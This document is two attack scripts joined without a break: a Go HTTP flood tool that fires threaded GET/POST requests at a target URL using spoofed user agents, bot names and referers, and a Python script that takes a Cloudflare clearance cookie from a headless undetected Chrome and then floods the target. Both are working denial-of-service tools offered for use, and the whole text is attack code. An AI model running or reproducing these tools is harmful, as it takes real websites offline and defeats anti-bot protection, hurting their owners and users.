/*
Coded by LeeOn123
Please fking code ur script by ur self, kid.

I changed the random integers range to the max of int32.
Now 386 systems should work well.

Looks like most people want to hit the url but not the host/ip.
As a result, here you are.
*/
package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	host      = ""
	port      = "80"
	page      = ""
	mode      = ""
	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start     = make(chan bool)
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
	key     string
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano()) //fixed seed problem
}
func getuseragent() string {

	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func contain(char string, x string) int { //simple compare
	times := 0
	ans := 0
	for i := 0; i < len(char); i++ {
		if char[times] == x[0] {
			ans = 1
		}
		times++
	}
	return ans
}

func flood() {
	addr := host + ":" + port
	header := ""
	if mode == "get" {
		header += " HTTP/1.1\r\nHost: "
		header += addr + "\r\n"
		if os.Args[5] == "nil" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += referers[rand.Intn(len(referers))] + "\r\n"
		} else {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		}
	} else if mode == "post" {
		data := ""
		if os.Args[5] != "nil" {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()

		} else {
			data = "f"
		}
		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
	}
	var s net.Conn
	var err error
	<-start //received signal
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host, //simple fix
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
		} else {
			for i := 0; i < 100; i++ {
				request := ""
				if os.Args[3] == "get" {
					request += "GET " + page + key
					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
				}
				request += header + "\r\n"
				s.Write([]byte(request))
			}
			s.Close()
		}
		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
	}
}

func main() {
	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
	fmt.Println("                          ||                                             ")
	fmt.Println("                         .||                     Golang version 2.0      ")
	fmt.Println("                                                        C0d3d by yoolz ni")
	fmt.Println("==========================================================================")
	if len(os.Args) != 6 {
		fmt.Println("Post Mode will use header.txt as data")
		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
		os.Exit(1)
	}
	u, err := url.Parse(os.Args[1])
	if err != nil {
		println("Please input a correct url")
	}
	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
	}
	if port == "" {
		port = "80"
	}
	page = u.Path
	if os.Args[3] != "get" && os.Args[3] != "post" {
		println("Wrong mode, Only can use \"get\" or \"post\"")
		return
	}
	mode = os.Args[3]
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Threads should be a integer")
	}
	limit, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("limit should be a integer")
	}
	if contain(page, "?") == 0 {
		key = "?"
	} else {
		key = "&"
	}

	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 100)
		go flood() // Start threads
		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
		os.Stdout.Sync()
		//time.Sleep( time.Millisecond * 1)
	}
	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
	close(start)
	time.Sleep(time.Duration(limit) * time.Second)
	//Keep the threads continue
}# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
init(convert=True)

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done | Ctrl + C to exit!                                   \n")
            return

#region get
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r').read().split('\n')
    return True

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

def get_info():
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t

def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass

if __name__ == '__main__':
        target, thread, t = get_info()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 300s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
